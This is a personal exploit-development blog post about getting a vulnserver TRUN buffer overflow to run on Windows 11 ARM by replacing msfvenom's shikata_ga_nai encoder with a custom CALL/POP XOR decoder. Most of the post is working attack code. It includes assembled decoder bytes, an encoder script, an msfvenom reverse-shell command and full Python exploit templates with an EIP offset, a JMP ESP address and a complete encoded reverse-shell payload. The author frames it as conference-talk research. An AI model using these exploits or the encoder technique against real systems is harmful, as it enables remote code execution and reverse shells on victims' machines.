---
description: 01/15/2026
---

# Custom Research: Bypassing Win 10/11 FPU "Issues" via Custom CALL/POP XOR Encoder

## Intro

Probably shouldn't make this public, but this one's for the people.

### Motivation

Why did I dive down this rabbit hole? Well, I'm trying to do a talk in Denver in February about Windows shellcoding and thought to myself well shit let's get this working on my ARM Mac since the battery life is so good and ARM is just fire, disagree w/ me? I'm sorry it's fire.&#x20;

**The Problem?**

Modern day Macs run on ARM architecture. However, Windows 11 on the AARCH64 architecture offers an emulation system known as [Prism](https://learn.microsoft.com/en-us/windows/arm/apps-on-arm-x86-emulation).&#x20;

And before you ask, yes this includes both emulation support for x86/64.

This was an absolute nightmare to discover because literally absolutely nobody on this planet has been talking about this stuff publicly it seems.&#x20;

However, I wanted to exploit vulnserver on my Mac through a Kali box that is hosting vulnserver on a Windows 11 AARCH64 box.

The result? Code execution worked flawlessly. In fact, I did not even have to change my exploit between architectures because Prism took care of it mostly.&#x20;

Reverse shells on their own embedded in malware compiled for x86/64 on AARCH64? No problem at all. However vulnserver? Yeah good luck.

This is where the rest falls into play. Enjoy.

This took me f$@#$@# forever to figure out, so hopefully this helps someone else out too, lol.

I can finally get a shell and use my ARM Mac to demo this at Wild West Hackin' Fest Mile High in Denver next month.

&#x20;Bypassing Windows 10 FPU GetPC Issues with a Custom CALL/POP XOR Encoder

### The Problem

When exploiting buffer overflows on modern Windows systems, you'll often encounter a frustrating issue: msfvenom's default encoder (`shikata_ga_nai`) crashes during shellcode execution. The crash looks something like this:

```
eax=00000000 ebx=00000000 ecx=00000052 edx=02ff4a30 esi=55bd55d0 edi=00401848
eip=089ff959 esp=089ff924 ebp=00000000
089ff959 317012          xor     dword ptr [eax+12h],esi
Attempt to read from address 00000012
```

The decoder is trying to dereference a register (EAX, EBP, or ESI) that contains a near-null value. This happens regardless of which encoder you request — msfvenom defaults to `shikata_ga_nai` whenever you use `-b "\x00"`.

### Why This Happens

The `shikata_ga_nai` encoder uses a technique called **GetPC** (Get Program Counter) to find its own location in memory. It needs this address to decode itself. The classic method uses FPU (Floating Point Unit) instructions:

```asm
fcmovb st, st(5)        ; Any FPU instruction
fnstenv [esp-0xc]       ; Save FPU state to stack
pop ebp                 ; Grab saved EIP from FPU state
```

When an FPU instruction executes, the CPU stores that instruction's address internally. The `fnstenv` instruction dumps the entire FPU state (including that saved address) onto the stack. The decoder then pops it into a register and uses it as a base pointer for decoding.

**On Windows 10, this breaks.** The FPU instruction pointer field often comes back as zeros. When the decoder does `pop ebp`, it gets `0x00000000` instead of the shellcode address, then crashes when it tries to use that null pointer.

### The Solution: CALL/POP GetPC

Instead of relying on FPU quirks, we can use a technique that works everywhere: **CALL/POP**.

When the CPU executes a `CALL` instruction, it pushes the address of the next instruction onto the stack before jumping. We can immediately `POP` that address into a register:

```asm
    jmp short call_label    ; Jump to the CALL
pop_label:
    pop esi                 ; ESI now contains address of encoded shellcode
    ; ... decoder logic ...
call_label:
    call pop_label          ; Pushes address of encoded shellcode, jumps back
    ; encoded shellcode starts here
```

This is 100% reliable because `CALL` always pushes the return address. No FPU state involved.

### Complete XOR Decoder

Here's the full decoder stub:

```asm
; CALL/POP XOR Decoder
; Offsets are critical - double-check before use

    jmp short 0x0f          ; Jump to CALL (offset 17)
    pop esi                 ; ESI = address of encoded shellcode
    xor ecx, ecx            ; Clear counter
    mov cx, <length>        ; Shellcode length (use mov cl for length < 256)
decode_loop:
    xor byte [esi], <key>   ; XOR decode one byte
    inc esi                 ; Next byte
    loop decode_loop        ; Repeat until ECX = 0
    jmp short 0x05          ; Jump over CALL to shellcode
    call <back_to_pop>      ; Push next address, jump to POP
    ; encoded shellcode here
```

#### Assembled Bytes

For shellcode under 256 bytes:

```python
decoder = (
    "\xeb\x0d"              # jmp short +13 (to CALL)
    "\x5e"                  # pop esi
    "\x31\xc9"              # xor ecx, ecx
    "\xb1\x00"              # mov cl, <length> - PATCH THIS BYTE
    "\x80\x36\x00"          # xor byte [esi], <key> - PATCH THIS BYTE
    "\x46"                  # inc esi
    "\xe2\xfa"              # loop -6
    "\xeb\x05"              # jmp short +5 (to shellcode)
    "\xe8\xee\xff\xff\xff"  # call -18 (back to pop esi)
)
```

For shellcode 256-65535 bytes:

```python
decoder = (
    "\xeb\x0f"              # jmp short +15 (to CALL)
    "\x5e"                  # pop esi
    "\x31\xc9"              # xor ecx, ecx
    "\x66\xb9\x00\x00"      # mov cx, <length> - PATCH THESE BYTES (little endian)
    "\x80\x36\x00"          # xor byte [esi], <key> - PATCH THIS BYTE
    "\x46"                  # inc esi
    "\xe2\xfa"              # loop -6
    "\xeb\x05"              # jmp short +5 (to shellcode)
    "\xe8\xec\xff\xff\xff"  # call -20 (back to pop esi)
)
```

### Finding a Safe XOR Key

The XOR key must not appear in the original shellcode (or it would produce null bytes when encoded). Use this script to find a safe key:

```python
#!/usr/bin/python3
import sys

def find_key_and_encode(hex_shellcode):
    shellcode = bytes.fromhex(hex_shellcode)
    
    for key in range(1, 256):
        encoded = bytes([b ^ key for b in shellcode])
        if b'\x00' not in encoded and key not in shellcode:
            print(f"Safe XOR key: 0x{key:02x}")
            print(f"Shellcode length: {len(shellcode)} (0x{len(shellcode):02x})")
            print("\nEncoded shellcode:")
            encoded_str = ''.join(f'\\x{b:02x}' for b in encoded)
            # Print in rows of 16 bytes for readability
            for i in range(0, len(encoded_str), 64):
                print(f'"{encoded_str[i:i+64]}"')
            return key, encoded
    
    print("ERROR: No safe XOR key found!")
    return None, None

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 encode.py <hex_shellcode>")
        print("Example: python3 encode.py $(msfvenom -p windows/exec CMD=calc.exe -f hex)")
        sys.exit(1)
    
    find_key_and_encode(sys.argv[1])
```

#### Usage

```bash
# Generate raw shellcode (with nulls is fine)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f hex

# Find safe key and encode
python3 encode.py fce8820000006089e531c0648b50308b520c...
```

### Complete Exploit Template

```python
#!/usr/bin/python
import socket

target = '10.211.55.6'
port = 9999

prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 16

# CALL/POP XOR decoder for shellcode > 255 bytes
# Length: 324 = 0x0144 (little endian: \x44\x01)
# Key: 0x09
decoder = (
    "\xeb\x0f"              # jmp short to call
    "\x5e"                  # pop esi
    "\x31\xc9"              # xor ecx, ecx
    "\x66\xb9\x44\x01"      # mov cx, 0x0144 (324)
    "\x80\x36\x09"          # xor byte [esi], 0x09
    "\x46"                  # inc esi
    "\xe2\xfa"              # loop -6
    "\xeb\x05"              # jmp short to shellcode
    "\xe8\xec\xff\xff\xff"  # call back to pop esi
)

encoded_shellcode = (
"\xf5\xe1\x8b\x09\x09\x09\x69\x80\xec\x38\xc9\x6d\x82\x59\x39\x82"
"\x5b\x05\x82\x5b\x1d\x82\x7b\x21\x06\xbe\x43\x2f\x38\xf6\xa5\x35"
"\x68\x75\x0b\x25\x29\xc8\xc6\x04\x08\xce\xeb\xfb\x5b\x5e\x82\x5b"
"\x19\x82\x43\x35\x82\x45\x18\x71\xea\x41\x08\xd8\x58\x82\x50\x29"
"\x08\xda\x82\x40\x11\xea\x33\x40\x82\x3d\x82\x08\xdf\x38\xf6\xa5"
"\xc8\xc6\x04\x08\xce\x31\xe9\x7c\xff\x0a\x74\xf1\x32\x74\x2d\x7c"
"\xed\x51\x82\x51\x2d\x08\xda\x6f\x82\x05\x42\x82\x51\x15\x08\xda"
"\x82\x0d\x82\x08\xd9\x80\x4d\x2d\x2d\x52\x52\x68\x50\x53\x58\xf6"
"\xe9\x56\x56\x53\x82\x1b\xe2\x84\x54\x61\x3a\x3b\x09\x09\x61\x7e"
"\x7a\x3b\x56\x5d\x61\x45\x7e\x2f\x0e\xf6\xdc\xb1\x99\x08\x09\x09"
"\x20\xcd\x5d\x59\x61\x20\x89\x62\x09\xf6\xdc\x59\x59\x59\x59\x49"
"\x59\x49\x59\x61\xe3\x06\xd6\xe9\xf6\xdc\x9e\x63\x0c\x61\x03\xda"
"\x3e\x0c\x61\x0b\x09\x0c\x30\x80\xef\x63\x19\x5f\x5e\x61\x90\xac"
"\x7d\x68\xf6\xdc\x8c\xc9\x7d\x05\xf6\x47\x01\x7c\xe5\x61\xf9\xbc"
"\xab\x5f\xf6\xdc\x61\x6a\x64\x6d\x09\x80\xea\x5e\x5e\x5e\x38\xff"
"\x63\x1b\x50\x5f\xeb\xf4\x6f\xce\x4d\x2d\x35\x08\x08\x84\x4d\x2d"
"\x19\xcf\x09\x4d\x5d\x59\x5f\x5f\x5f\x4f\x5f\x47\x5f\x5f\x5a\x5f"
"\x61\x70\xc5\x36\x8f\xf6\xdc\x80\xe9\x47\x5f\x4f\xf6\x39\x61\x01"
"\x8e\x14\x69\xf6\xdc\xb2\xf9\xbc\xab\x5f\x61\xaf\x9c\xb4\x94\xf6"
"\xdc\x35\x0f\x75\x03\x89\xf2\xe9\x7c\x0c\xb2\x4e\x1a\x7b\x66\x63"
"\x09\x5a\xf6\xdc"
)

padding = 'F' * (3000 - len(prefix) - 4 - len(nopsled) - len(decoder) - len(encoded_shellcode))
payload = prefix + eip + nopsled + decoder + encoded_shellcode + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.recv(1024)
s.send('TRUN .' + payload + '\r\n')
s.close()
```

### Extended Exploit Template

```python
#!/usr/bin/python
import socket

target = '10.211.55.6'
port = 9999

prefix = 'A' * 2006                    # Offset to EIP
eip = '\xaf\x11\x50\x62'               # JMP ESP address
nopsled = '\x90' * 16

# ============================================================
# IMPORTANT: Choose the correct decoder based on shellcode size
# ============================================================

# OPTION 1: For shellcode < 256 bytes (e.g., calc.exe payload ~196 bytes)
# Patch byte at offset 7 with shellcode length
# Patch byte at offset 10 with XOR key
decoder_small = (
    "\xeb\x0d"              # jmp short +13 (to call)
    "\x5e"                  # pop esi
    "\x31\xc9"              # xor ecx, ecx
    "\xb1\xc4"              # mov cl, <length> (e.g., 0xc4 = 196)
    "\x80\x36\x07"          # xor byte [esi], <key> (e.g., 0x07)
    "\x46"                  # inc esi
    "\xe2\xfa"              # loop -6
    "\xeb\x05"              # jmp short +5 (to shellcode)
    "\xe8\xee\xff\xff\xff"  # call -18 (back to pop esi)
)

# OPTION 2: For shellcode 256-65535 bytes (e.g., reverse shell ~324 bytes)
# Patch bytes at offset 7-8 with shellcode length (little endian)
# Patch byte at offset 12 with XOR key
decoder_large = (
    "\xeb\x0f"              # jmp short +15 (to call)
    "\x5e"                  # pop esi
    "\x31\xc9"              # xor ecx, ecx
    "\x66\xb9\x44\x01"      # mov cx, <length> (e.g., 0x0144 = 324, little endian)
    "\x80\x36\x09"          # xor byte [esi], <key> (e.g., 0x09)
    "\x46"                  # inc esi
    "\xe2\xfa"              # loop -6
    "\xeb\x05"              # jmp short +5 (to shellcode)
    "\xe8\xec\xff\xff\xff"  # call -20 (back to pop esi)
)

# Choose decoder based on your shellcode size
decoder = decoder_large  # Use decoder_small for payloads < 256 bytes

# XOR-encoded shellcode (output from encode.py)
encoded_shellcode = (
    "\xf5\xe1\x8b\x09\x09\x09..."
    # ... rest of encoded shellcode
)

padding = 'F' * (3000 - len(prefix) - 4 - len(nopsled) - len(decoder) - len(encoded_shellcode))
payload = prefix + eip + nopsled + decoder + encoded_shellcode + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.recv(1024)
s.send('TRUN .' + payload + '\r\n')
s.close()
```

### Debugging Tips

If the exploit still crashes, use WinDbg to step through:

```
bp <jmp_esp_address>
g
t 20
```

**Common issues:**

* **Wrong jump offsets**: The `jmp` and `call` offsets are relative and must be exact
* **Wrong shellcode length**: Double-check the byte count
* **Additional bad characters**: Some protocols filter more than just null bytes

### Summary

| Technique         | Method                     | Windows 10 Compatible |
| ----------------- | -------------------------- | --------------------- |
| shikata\_ga\_nai  | FPU fnstenv                | ❌ No                  |
| fnstenv\_mov      | FPU fnstenv                | ❌ No                  |
| CALL/POP (custom) | CALL pushes return address | ✅ Yes                 |

When msfvenom's encoders fail on modern Windows, roll your own CALL/POP decoder. It's simple, reliable, and doesn't depend on FPU state that may not be populated correctly.
